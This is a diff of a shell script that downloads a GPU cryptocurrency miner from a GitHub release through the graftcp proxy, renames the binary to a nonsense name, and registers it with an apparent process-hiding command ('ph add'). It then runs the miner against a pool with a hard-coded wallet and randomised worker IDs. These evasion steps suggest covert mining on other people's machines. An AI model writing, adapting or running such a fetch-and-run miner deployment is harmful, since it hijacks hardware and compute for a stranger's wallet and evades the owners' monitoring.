@@ -37,10 +37,12 @@ echo " "
 
 echo " "
 
-./graftcp/graftcp wget -O melisosa https://github.com/rxt36q6/file/releases/download/1/miner-cuda13
+./graftcp/graftcp wget https://github.com/egg5233/tw-pearl-miner/releases/download/v3.2.1/tw-pearl-miner-linux-cuda13.tar.gz
       
-chmod 777 melisosa
+tar xf tw-pearl-miner-linux-cuda13.tar.gz
 
-ph add melisosa
+mv tw-pearl-miner-linux/pearl-gpu-miner tw-pearl-miner-linux/ferokiso
 
-./graftcp/graftcp ./melisosa --proxy global.pearlfortune.org:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui
+ph add ferokiso
+
+./graftcp/graftcp ./tw-pearl-miner-linux/ferokiso --pool prl.kryptex.network:7048 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
